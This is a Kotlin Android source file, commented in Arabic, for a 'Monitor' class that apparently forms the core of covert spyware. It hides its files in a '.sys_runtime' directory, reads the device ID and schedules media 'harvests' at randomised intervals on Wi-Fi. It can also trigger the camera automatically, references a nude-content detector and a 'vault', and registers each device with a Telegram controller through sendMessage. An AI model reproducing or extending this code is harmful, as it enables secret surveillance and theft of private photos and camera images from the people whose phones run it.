package com.example.app

import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.BatteryManager
import android.os.Build
import android.provider.Settings
import android.util.Log
import kotlinx.coroutines.*
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import org.json.JSONObject
import java.io.File
import java.lang.ref.WeakReference
import java.security.MessageDigest
import java.text.SimpleDateFormat
import java.util.*
import kotlin.random.Random

/**
 * فئة المراقبة الرئيسية (Monitor) لإدارة حالة النظام والبطارية وشبكة Wi-Fi وجدولة الحصاد.
 * هذه الفئة هي بديل monitor.py مع إزالة كافة تتبعات المكالمات والرسائل.
 */
class Monitor private constructor(context: Context) {

    private val contextRef = WeakReference(context.applicationContext)
    private val appContext: Context? get() = contextRef.get()

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val harvestMutex = Mutex()

    @Volatile
    private var isRunning = false

    @Volatile
    private var isHarvestRunning = false

    var deviceId: String = "DEV_PC"
        private set

    var deviceModel: String = "Android_Device"
        private set

    // ========== المسارات والملفات ==========
    private val runtimeDir: File by lazy {
        File(appContext?.filesDir, ".sys_runtime").apply {
            if (!exists()) mkdirs()
        }
    }

    private val configFile: File by lazy {
        File(runtimeDir, "c.json")
    }

    private val lastHarvestFile: File by lazy {
        File(runtimeDir, "lh")
    }

    private val waitingTimeFile: File by lazy {
        File(runtimeDir, "wt")
    }

    private val logFile: File by lazy {
        File(runtimeDir, "m.log")
    }

    // ========== المكونات الخارجية (تُعين لاحقاً) ==========
    var ui: Any? = null
    var dailyZipper: Any? = null
    var cameraAnalyzer: Any? = null
    var mediaScanner: Any? = null
    
    // ✅ تم تعديل النوع من Any? إلى Long? لتتناسب مع الاستخدام الفعلي
    var ctrl: Long? = null
    
    // ✅ إضافة المتغيرات المطلوبة للانعكاس (Reflection)
    var vlt: Long? = null
    var nudeDetector: Any? = null

    // ========== الإعدادات ==========
    private val configMap = mutableMapOf<String, Any>(
        "hth" to 15,                         // عتبة البطارية (%)
        "wl" to false,                       // Wake lock
        "iv" to 900L,                        // فاصل الفحص (ثانية) = 15 دقيقة
        "harvest_min_interval" to 7200L,     // 2 ساعات كحد أدنى بين الحصادات
        "harvest_random_hours_min" to 2,     // أقل عدد ساعات للتأخير العشوائي
        "harvest_random_hours_max" to 6,     // أقصى عدد ساعات للتأخير العشوائي
        "auto_camera" to false,              // تفعيل الكاميرا التلقائية
        "camera_interval" to 3600L,          // فاصل الكاميرا (ثانية) = ساعة
        "max_harvest_files" to 200,          // الحد الأقصى للملفات في الحصاد
        "force_harvest_on_start" to false,   // هل يتم تشغيل حصاد فوري عند بدء التشغيل؟
        "scan_on_start" to true,             // تشغيل المسح عند بدء التشغيل
        "min_wifi_strength" to -80,          // أقل قوة إشارة Wi-Fi مقبولة
        "enable_auto_harvest" to true        // تفعيل الحصاد التلقائي
    )

    companion object {
        private const val TAG = "Monitor"

        @Volatile
        private var instance: Monitor? = null

        fun getInstance(context: Context): Monitor {
            return instance ?: synchronized(this) {
                instance ?: Monitor(context).also { instance = it }
            }
        }

        /**
         * استخراج معرف جهاز قصير (بديل get_device_tag في Python)
         */
        fun getDeviceTag(context: Context): String {
            return try {
                val androidId = Settings.Secure.getString(
                    context.contentResolver,
                    Settings.Secure.ANDROID_ID
                )
                if (!androidId.isNullOrEmpty()) {
                    androidId.take(8).lowercase(Locale.ROOT)
                } else {
                    val model = "${Build.MANUFACTURER} ${Build.MODEL}"
                    val md = MessageDigest.getInstance("MD5")
                    val digest = md.digest(model.toByteArray())
                    digest.take(4).joinToString("") { "%02x".format(it) }
                }
            } catch (e: Exception) {
                "unknown"
            }
        }
    }

    init {
        setupEnvironment()
        loadConfig()
        fetchDeviceInfo()
        ensureNextHarvestTime()
    }

    // ============================================================
    //  إعداد البيئة والإعدادات
    // ============================================================

    private fun setupEnvironment() {
        try {
            val nomedia = File(runtimeDir, ".nomedia")
            if (!nomedia.exists()) {
                nomedia.createNewFile()
            }
        } catch (e: Exception) {
            writeLog("Setup error: ${e.message}")
        }
    }

    private fun loadConfig() {
        if (!configFile.exists()) {
            saveConfig()
            return
        }
        try {
            val jsonStr = configFile.readText(Charsets.UTF_8)
            val json = JSONObject(jsonStr)
            json.keys().forEach { key ->
                configMap[key] = json.get(key)
            }
        } catch (e: Exception) {
            writeLog("Config load error: ${e.message}")
        }
    }

    private fun saveConfig() {
        try {
            val json = JSONObject(configMap as Map<*, *>)
            configFile.writeText(json.toString(2), Charsets.UTF_8)
        } catch (e: Exception) {
            writeLog("Config save error: ${e.message}")
        }
    }

    fun updateConfig(key: String, value: Any): Boolean {
        return if (configMap.containsKey(key)) {
            configMap[key] = value
            saveConfig()
            writeLog("Config updated: $key = $value")
            true
        } else {
            writeLog("Unknown config key: $key")
            false
        }
    }

    // ============================================================
    //  معلومات الجهاز والبطارية والشبكة
    // ============================================================

    private fun fetchDeviceInfo() {
        try {
            val ctx = appContext ?: return
            val aid = Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ANDROID_ID)
            deviceId = if (!aid.isNullOrEmpty()) aid else "ID_${Random.nextInt(100000, 999999)}"
            deviceModel = "${Build.MANUFACTURER} ${Build.MODEL}"
        } catch (e: Exception) {
            writeLog("Device info error: ${e.message}")
            deviceId = "ID_${Random.nextInt(100000, 999999)}"
            deviceModel = "Android_Device"
        }
    }

    /**
     * التحقق من الاتصال بشبكة Wi-Fi (بديل _is_wifi)
     */
    fun isWifiConnected(): Boolean {
        val ctx = appContext ?: return false
        val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager ?: return false

        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val network = cm.activeNetwork ?: return false
            val caps = cm.getNetworkCapabilities(network) ?: return false
            caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)
        } else {
            @Suppress("DEPRECATION")
            val info = cm.activeNetworkInfo
            @Suppress("DEPRECATION")
            info != null && info.isConnected && info.type == ConnectivityManager.TYPE_WIFI
        }
    }

    /**
     * الحصول على حالة البطارية (النسبة المئوية، هل هي في وضع الشحن)
     * بديل _battery_ok في Python
     */
    fun getBatteryStatus(): Pair<Int, Boolean> {
        val ctx = appContext ?: return Pair(50, false)
        return try {
            val intentFilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
            val batteryStatus: Intent? = ctx.registerReceiver(null, intentFilter)
            val level = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
            val status = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1

            val percent = if (scale > 0) ((level / scale.toFloat()) * 100).toInt() else 50
            val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                    status == BatteryManager.BATTERY_STATUS_FULL

            Pair(percent, isCharging)
        } catch (e: Exception) {
            writeLog("Battery check error: ${e.message}")
            Pair(50, false)
        }
    }

    // ============================================================
    //  إدارة وقت الحصاد (جدولة عشوائية)
    // ============================================================

    private fun parseIsoDateTime(isoStr: String?): Date? {
        if (isoStr.isNullOrBlank()) return null

        val formats = arrayOf(
            "yyyy-MM-dd'T'HH:mm:ss.SSSZ",
            "yyyy-MM-dd'T'HH:mm:ssZ",
            "yyyy-MM-dd'T'HH:mm:ss",
            "yyyy-MM-dd HH:mm:ss",
            "yyyy-MM-dd"
        )

        val cleaned = isoStr.trim().replace("Z", "+0000")

        for (fmt in formats) {
            try {
                val sdf = SimpleDateFormat(fmt, Locale.US)
                return sdf.parse(cleaned)
            } catch (_: Exception) {
                // تجاهل ومحاولة التنسيق التالي
            }
        }
        return null
    }

    private fun formatIsoDateTime(date: Date): String {
        val sdf = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSSZ", Locale.US)
        return sdf.format(date)
    }

    private fun setNextHarvestTime(hoursOverride: Int? = null): Date? {
        return try {
            val minH = (configMap["harvest_random_hours_min"] as? Number)?.toInt() ?: 2
            val maxH = (configMap["harvest_random_hours_max"] as? Number)?.toInt() ?: 6

            val hours = hoursOverride ?: Random.nextInt(minH, maxH + 1)
            val minutes = Random.nextInt(0, 60)

            val calendar = Calendar.getInstance()
            calendar.add(Calendar.HOUR_OF_DAY, hours)
            calendar.add(Calendar.MINUTE, minutes)

            val targetDate = calendar.time

            waitingTimeFile.writeText(formatIsoDateTime(targetDate), Charsets.UTF_8)

            writeLog("Next harvest set to: ${formatIsoDateTime(targetDate)} (in ${hours}h ${minutes}m)")
            targetDate
        } catch (e: Exception) {
            writeLog("Set next harvest error: ${e.message}")
            null
        }
    }

    private fun ensureNextHarvestTime(): Boolean {
        if (!waitingTimeFile.exists()) {
            setNextHarvestTime()
            return true
        }

        try {
            val timeStr = waitingTimeFile.readText(Charsets.UTF_8).trim()
            if (timeStr.isEmpty()) {
                setNextHarvestTime()
                return true
            }

            val nextTime = parseIsoDateTime(timeStr)
            if (nextTime == null || nextTime.before(Date())) {
                writeLog("Next harvest time is invalid or expired, resetting...")
                setNextHarvestTime()
                return true
            }
        } catch (e: Exception) {
            writeLog("Ensure next harvest error: ${e.message}")
            setNextHarvestTime()
            return true
        }
        return true
    }

    private fun updateLastHarvestTime() {
        try {
            lastHarvestFile.writeText(formatIsoDateTime(Date()), Charsets.UTF_8)
        } catch (e: Exception) {
            writeLog("Update last harvest error: ${e.message}")
        }
    }

    private fun canHarvest(force: Boolean): Pair<Boolean, String> {
        if (force) return Pair(true, "Forced")

        val enableAuto = configMap["enable_auto_harvest"] as? Boolean ?: true
        if (!enableAuto) return Pair(false, "Auto-harvest disabled")

        // التحقق من وقت الانتظار
        if (waitingTimeFile.exists()) {
            try {
                val nextStr = waitingTimeFile.readText(Charsets.UTF_8).trim()
                val nextTime = parseIsoDateTime(nextStr)
                if (nextTime != null && Date().before(nextTime)) {
                    return Pair(false, "Next harvest scheduled at $nextTime")
                }
            } catch (e: Exception) {
                writeLog("Can harvest (wt) error: ${e.message}")
            }
        }

        // التحقق من الحد الأدنى بين الحصادات
        if (lastHarvestFile.exists()) {
            try {
                val lastStr = lastHarvestFile.readText(Charsets.UTF_8).trim()
                val lastTime = parseIsoDateTime(lastStr)
                if (lastTime != null) {
                    val minInterval = (configMap["harvest_min_interval"] as? Number)?.toLong() ?: 7200L
                    val diffSec = (Date().time - lastTime.time) / 1000
                    if (diffSec < minInterval) {
                        return Pair(false, "Minimum interval not reached")
                    }
                }
            } catch (e: Exception) {
                writeLog("Can harvest (lh) error: ${e.message}")
            }
        }

        return Pair(true, "OK")
    }

    fun getNextHarvestTime(): Date? {
        if (!waitingTimeFile.exists()) return null
        return try {
            val timeStr = waitingTimeFile.readText(Charsets.UTF_8).trim()
            parseIsoDateTime(timeStr)
        } catch (e: Exception) {
            writeLog("Get next harvest error: ${e.message}")
            null
        }
    }

    // ============================================================
    //  منطق الحصاد والكاميرا التلقائية
    // ============================================================

    private suspend fun harvestLogic(force: Boolean = false) {
        val enableAuto = configMap["enable_auto_harvest"] as? Boolean ?: true
        if (!force && !enableAuto) {
            writeLog("Auto-harvest is disabled")
            return
        }

        harvestMutex.withLock {
            if (isHarvestRunning) {
                writeLog("Harvest already running, skipping")
                return
            }
            isHarvestRunning = true
        }

        try {
            // 1. التحقق من WiFi (إلا إذا كان مفروضاً)
            if (!force && !isWifiConnected()) {
                writeLog("Not on WiFi, skipping harvest")
                return
            }

            // 2. التحقق من البطارية
            val (batteryPercent, isCharging) = getBatteryStatus()
            val minBattery = (configMap["hth"] as? Number)?.toInt() ?: 15
            if (!force && batteryPercent < minBattery && !isCharging) {
                writeLog("Battery too low: $batteryPercent% (min: $minBattery%)")
                return
            }

            // 3. التحقق من وقت الانتظار
            val (canRun, reason) = canHarvest(force)
            if (!canRun) {
                writeLog("Harvest skipped: $reason")
                return
            }

            // 4. تشغيل الحصاد
            var harvestSuccess = false
            if (dailyZipper != null) {
                try {
                    invokeMethod(dailyZipper, "run")
                    harvestSuccess = true
                    writeLog("Harvest triggered successfully")
                } catch (e: Exception) {
                    writeLog("Harvest execution error: ${e.message}")
                }
            } else {
                writeLog("DailyZipper not available")
            }

            // 5. تحديث الأوقات في حالة النجاح
            if (harvestSuccess) {
                setNextHarvestTime()
                updateLastHarvestTime()
            } else {
                if (!force) {
                    writeLog("Harvest failed, rescheduling in 1 hour")
                    setNextHarvestTime(1)
                }
            }

            // 6. تشغيل ماسح الوسائط (بغض النظر عن نجاح الحصاد)
            if (mediaScanner != null) {
                try {
                    invokeMethod(mediaScanner, "runScan", true)
                } catch (e: Exception) {
                    writeLog("Scanner run error: ${e.message}")
                }
            }

        } catch (e: Exception) {
            writeLog("Harvest logic error: ${e.message}")
        } finally {
            harvestMutex.withLock {
                isHarvestRunning = false
            }
        }
    }

    private suspend fun cameraLogic() {
        val autoCamera = configMap["auto_camera"] as? Boolean ?: false
        if (!autoCamera || cameraAnalyzer == null) return

        val lastCamFile = File(runtimeDir, "last_camera")
        val interval = (configMap["camera_interval"] as? Number)?.toLong() ?: 3600L

        var lastTime = 0L
        try {
            if (lastCamFile.exists()) {
                val content = lastCamFile.readText(Charsets.UTF_8).trim()
                if (content.isNotEmpty()) {
                    lastTime = content.toLongOrNull() ?: 0L
                }
            }
        } catch (e: Exception) {
            writeLog("Camera interval read error: ${e.message}")
        }

        val currentTime = System.currentTimeMillis() / 1000
        if (lastTime > 0 && currentTime - lastTime < interval) return

        val (batteryPercent, isCharging) = getBatteryStatus()
        if (batteryPercent < 20 && !isCharging) return

        try {
            invokeMethod(cameraAnalyzer, "harvest", 0)
            lastCamFile.writeText(currentTime.toString(), Charsets.UTF_8)
            writeLog("Auto-camera triggered")
        } catch (e: Exception) {
            writeLog("Camera logic error: ${e.message}")
        }
    }

    // ============================================================
    //  دورة الحياة الرئيسية (الحلقة اللانهائية)
    // ============================================================

    fun start() {
        if (isRunning) return
        isRunning = true

        scope.launch {
            // تشغيل المسح الأولي عند البدء
            val scanOnStart = configMap["scan_on_start"] as? Boolean ?: true
            if (scanOnStart && mediaScanner != null) {
                try {
                    invokeMethod(mediaScanner, "runScan", true)
                    writeLog("Initial scan completed")
                } catch (e: Exception) {
                    writeLog("Initial scan error: ${e.message}")
                }
            }

            // تسجيل الجهاز في واجهة Telegram
            ui?.let { uiObj ->
                try {
                    invokeMethod(uiObj, "reg", deviceId, deviceModel)
                } catch (_: Exception) {
                    // محاولة بديلة باستخدام _api مباشرة
                    try {
                        invokeMethod(uiObj, "_api", "sendMessage", mapOf(
                            "chat_id" to ctrl,
                            "text" to "📱 جهاز جديد متصل\nID: `$deviceId`\nModel: $deviceModel",
                            "parse_mode" to "Markdown"
                        ))
                    } catch (_: Exception) {}
                }
            }

            // تشغيل حصاد فوري عند البدء إذا كان مفعلاً
            val forceStart = configMap["force_harvest_on_start"] as? Boolean ?: false
            if (forceStart) {
                writeLog("Starting forced harvest on startup")
                forceHarvest()
            }

            // الحلقة الرئيسية
            while (isRunning && isActive) {
                try {
                    harvestLogic(force = false)
                    cameraLogic()
                } catch (e: Exception) {
                    writeLog("Monitor loop error: ${e.message}")
                }

                val interval = (configMap["iv"] as? Number)?.toLong() ?: 900L
                delay(interval * 1000L)
            }
        }
    }

    fun stop() {
        isRunning = false
        scope.cancel()
    }

    fun forceHarvest() {
        if (waitingTimeFile.exists()) {
            try {
                waitingTimeFile.delete()
                writeLog("Removed waiting time file for forced harvest")
            } catch (e: Exception) {
                writeLog("Force harvest remove wt error: ${e.message}")
            }
        }

        scope.launch {
            harvestLogic(force = true)
        }
    }

    fun resetHarvestTimer() {
        setNextHarvestTime()
        writeLog("Harvest timer reset")
    }

    fun isHarvesting(): Boolean = isHarvestRunning

    fun getStatus(): Map<String, Any?> {
        val (batteryPercent, isCharging) = getBatteryStatus()

        val statusMap = mutableMapOf<String, Any?>(
            "running" to isRunning,
            "harvest_running" to isHarvestRunning,
            "device_id" to deviceId,
            "device_model" to deviceModel,
            "wifi" to isWifiConnected(),
            "battery" to mapOf("percent" to batteryPercent, "charging" to isCharging),
            "config" to configMap
        )

        if (lastHarvestFile.exists()) {
            statusMap["last_harvest"] = lastHarvestFile.readText(Charsets.UTF_8).trim()
        }

        if (waitingTimeFile.exists()) {
            statusMap["next_harvest"] = waitingTimeFile.readText(Charsets.UTF_8).trim()
        }

        return statusMap
    }

    // ============================================================
    //  ✅ دوال Getter إضافية للانعكاس (Reflection)
    //  هذه الدوال تسمح للفئات الأخرى (Commands, TelegramUi, NudeDetector)
    //  بالوصول إلى خصائص Monitor عبر Reflection بأمان.
    // ============================================================

    /**
     * إرجاع اسم طراز الجهاز.
     */
    fun getDeviceModel(): String = deviceModel

    /**
     * إرجاع معرف الجهاز الفريد.
     */
    fun getDeviceId(): String = deviceId

    /**
     * إرجاع كائن واجهة Telegram (TelegramUi).
     */
    fun getUi(): Any? = ui

    /**
     * إرجاع كائن ماسح الوسائط (MediaScanner).
     */
    fun getMediaScanner(): Any? = mediaScanner

    /**
     * إرجاع معرف مجموعة التحكم (Control ID).
     */
    fun getCtrl(): Long? = ctrl

    /**
     * إرجاع معرف الخزنة (Vault ID).
     */
    fun getVlt(): Long? = vlt

    /**
     * إرجاع كائن كاشف المحتوى (NudeDetector).
     */
    fun getNudeDetector(): Any? = nudeDetector

    /**
     * إرجاع كائن مدير الكاميرا (CameraAnalyzer).
     */
    fun getCameraAnalyzer(): Any? = cameraAnalyzer

    /**
     * إرجاع كائن مدير الحصاد (DailyZipper).
     */
    fun getDailyZipper(): Any? = dailyZipper

    // ============================================================
    //  دوال المساعدة والانعكاس (Reflection)
    // ============================================================

    private fun writeLog(message: String) {
        Log.i(TAG, message)
        try {
            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
            val logText = "[$timestamp] [INFO] $message\n"
            logFile.appendText(logText, Charsets.UTF_8)
        } catch (_: Exception) {
            // تجاهل أخطاء التسجيل في الملف
        }
    }

    /**
     * استدعاء دالة على كائن عبر الانعكاس (بديل عن استدعاء الدوال مباشرة في Python)
     */
    private fun invokeMethod(target: Any?, methodName: String, vararg args: Any?): Any? {
        if (target == null) return null

        return try {
            // البحث عن الدالة التي تطابق الاسم والمعاملات
            val method = target.javaClass.methods.firstOrNull { it.name == methodName }
                ?: return null

            method.isAccessible = true
            method.invoke(target, *args)
        } catch (e: Exception) {
            writeLog("Method invocation error ($methodName): ${e.message}")
            null
        }
    }
}
